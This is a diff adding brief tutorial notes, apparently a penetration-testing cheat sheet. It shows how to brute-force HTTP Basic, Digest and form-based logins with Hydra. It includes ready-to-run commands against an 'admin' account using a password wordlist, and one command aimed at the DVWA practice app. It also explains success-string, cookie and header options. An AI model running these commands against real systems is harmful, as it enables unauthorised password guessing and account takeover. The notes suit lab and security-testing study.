@@ -1,0 +1,23 @@
+-U        service module usage details
+hydra http-post-form -U
+
+
+Brute forcing HTTP Basic Authentication
+hydra -l admin -P wordlist target.com http-head /private/
+
+Brute forcing HTTP Digest Authentication
+hydra -l admin -P wordlist target.com http-get /private/
+
+Brute forcing HTTP Form Based Authentication
+hydra -l admin -P wordlist target.com http-post-form "login.php:loginname=^USER^&password=^PASS^&login=Login:Not Allowed"
+
+hydra -l admin -P wordlist target.com http-post-form "dvwa/login.php:username=^USER^&password=^PASS^&login=Login:failed"
+
+if you put "S=" infront of the failure string variable, it becomes a success string check.
+Remember that the "failure" and "success" string does not have to be part of the HTML of the page. These strings could be information in the reponse header. such as cookie being set, or locations of redirects. There are flexible options for dealing with pretty much any type of response. as long as it is repeatable and there are distinct differences between success and failure, Other more complex examples may be where you need to specify particular header values, or use an additional page to obtain set browser cookies before the form is submitted. There can be done by adding the additional parameters.
+"C="  and  "H=" on the end.
+
+
+1, "login.php:user=^USER^&pass=^PASS^:S=success:C=/page/cookie:H=X-Foo:Foo"
+2, "H=Cookie:SESSIONID=......"
+   "H=Cookie:security=low;PHPSESSID=......"
